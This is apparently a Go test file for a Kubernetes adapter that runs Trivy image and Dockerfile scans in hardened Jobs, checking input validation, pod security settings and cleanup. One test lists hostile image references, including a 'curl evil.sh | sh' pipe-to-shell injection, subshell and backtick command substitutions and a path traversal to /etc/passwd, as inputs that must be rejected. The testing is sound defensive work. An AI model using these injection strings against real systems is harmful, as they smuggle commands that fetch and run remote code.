package k8strivyscanner_test

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/client-go/kubernetes/fake"
	k8stesting "k8s.io/client-go/testing"

	"github.com/Ruhanyat-994/GuardPipe/internal/adapters/k8strivyscanner"
)

const namespace = "guardpipe"

// newCompletingClientset seeds a finished pod for every Job created — the
// same Tracker().Add pattern as k8scodescanscanner's tests (Pods().Create
// from inside a reactor deadlocks the fake clientset).
func newCompletingClientset(t *testing.T, exitCode int32) (*fake.Clientset, *[]*batchv1.Job) {
	t.Helper()
	client := fake.NewSimpleClientset()
	var jobs []*batchv1.Job
	client.PrependReactor("create", "jobs", func(action k8stesting.Action) (bool, runtime.Object, error) {
		job := action.(k8stesting.CreateAction).GetObject().(*batchv1.Job)
		job.UID = types.UID("uid-" + job.Name)
		jobs = append(jobs, job)
		phase := corev1.PodSucceeded
		if exitCode != 0 {
			phase = corev1.PodFailed
		}
		pod := &corev1.Pod{
			ObjectMeta: metav1.ObjectMeta{Name: job.Name + "-pod", Namespace: namespace, Labels: job.Spec.Template.Labels},
			Status: corev1.PodStatus{Phase: phase, ContainerStatuses: []corev1.ContainerStatus{{
				Name:  "trivy",
				State: corev1.ContainerState{Terminated: &corev1.ContainerStateTerminated{ExitCode: exitCode}},
			}}},
		}
		if err := client.Tracker().Add(pod); err != nil {
			t.Fatalf("seed pod: %v", err)
		}
		return false, job, nil
	})
	return client, &jobs
}

func newScanner(client *fake.Clientset) *k8strivyscanner.Scanner {
	return k8strivyscanner.New(client, namespace, k8strivyscanner.Config{Timeout: 5 * time.Second}, 1)
}

func TestScanImage_RefusesHostileImageReferencesWithoutCreatingAJob(t *testing.T) {
	for _, ref := range []string{
		"alpine; curl evil.sh | sh",
		"$(id)",
		"alpine`id`",
		"-oops",
		"alpine latest",
		"../../etc/passwd",
		"",
	} {
		t.Run(ref, func(t *testing.T) {
			client := fake.NewSimpleClientset()
			_, err := newScanner(client).ScanImage(context.Background(), ref)
			require.Error(t, err)
			jobs, _ := client.BatchV1().Jobs(namespace).List(context.Background(), metav1.ListOptions{})
			require.Empty(t, jobs.Items)
		})
	}
}

// The image reference comes from a scanned repository: it must reach Trivy
// as a positional argument, never as part of the shell script text.
func TestScanImage_PassesTheReferenceAsAnArgumentNotScriptText(t *testing.T) {
	client, jobs := newCompletingClientset(t, 0)
	_, _ = newScanner(client).ScanImage(context.Background(), "ghcr.io/acme/app:1.2.3")

	require.Len(t, *jobs, 1)
	c := (*jobs)[0].Spec.Template.Spec.Containers[0]
	require.Equal(t, []string{"sh", "-c"}, c.Command[:2])
	require.NotContains(t, c.Command[2], "ghcr.io/acme/app", "reference leaked into the script")
	require.Equal(t, "ghcr.io/acme/app:1.2.3", c.Command[len(c.Command)-1])
}

func TestJob_IsLockedDown(t *testing.T) {
	client, jobs := newCompletingClientset(t, 0)
	_, _ = newScanner(client).ScanImage(context.Background(), "alpine:3.20")

	spec := (*jobs)[0].Spec.Template.Spec
	sc := spec.Containers[0].SecurityContext
	require.True(t, *sc.RunAsNonRoot)
	require.True(t, *sc.ReadOnlyRootFilesystem)
	require.False(t, *sc.AllowPrivilegeEscalation)
	require.Equal(t, []corev1.Capability{"ALL"}, sc.Capabilities.Drop)
	require.Equal(t, corev1.SeccompProfileTypeRuntimeDefault, spec.SecurityContext.SeccompProfile.Type)
	require.False(t, *spec.AutomountServiceAccountToken)
	require.Contains(t, (*jobs)[0].Labels, k8strivyscanner.RunLabelKey)
}

func TestScanConfig_NoDockerfileRunsNoJob(t *testing.T) {
	client := fake.NewSimpleClientset()
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, "main.go"), []byte("package main\n"), 0o644))

	report, err := newScanner(client).ScanConfig(context.Background(), dir)
	require.NoError(t, err)
	require.Empty(t, report.Results)
	jobs, _ := client.BatchV1().Jobs(namespace).List(context.Background(), metav1.ListOptions{})
	require.Empty(t, jobs.Items)
}

// The Dockerfiles travel in a ConfigMap owned by the Job (garbage-collected
// with it), mounted at their own relative paths; vendored ones are skipped.
func TestScanConfig_ShipsDockerfilesInAConfigMapOwnedByTheJob(t *testing.T) {
	client, jobs := newCompletingClientset(t, 0)
	var created *corev1.ConfigMap
	client.PrependReactor("create", "configmaps", func(action k8stesting.Action) (bool, runtime.Object, error) {
		created = action.(k8stesting.CreateAction).GetObject().(*corev1.ConfigMap)
		return false, nil, nil
	})
	dir := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(dir, "backend"), 0o755))
	require.NoError(t, os.MkdirAll(filepath.Join(dir, "node_modules", "x"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(dir, "backend", "Dockerfile"), []byte("FROM alpine\n"), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(dir, "node_modules", "x", "Dockerfile"), []byte("FROM evil\n"), 0o644))

	_, _ = newScanner(client).ScanConfig(context.Background(), dir)

	require.NotNil(t, created)
	require.Len(t, created.Data, 1)
	require.Len(t, created.OwnerReferences, 1)
	require.Equal(t, "Job", created.OwnerReferences[0].Kind)
	require.Equal(t, (*jobs)[0].Name, created.OwnerReferences[0].Name)
	vol := (*jobs)[0].Spec.Template.Spec.Volumes[1].ConfigMap
	require.Equal(t, "backend/Dockerfile", vol.Items[0].Path)
}

func TestScan_NonZeroExitFailsAndCleansUpTheJob(t *testing.T) {
	client, _ := newCompletingClientset(t, 1)
	_, err := newScanner(client).ScanImage(context.Background(), "alpine:3.20")
	require.Error(t, err)
	require.True(t, strings.Contains(err.Error(), "exited 1"), err.Error())
	jobs, _ := client.BatchV1().Jobs(namespace).List(context.Background(), metav1.ListOptions{})
	require.Empty(t, jobs.Items, "job must be deleted even on failure")
}
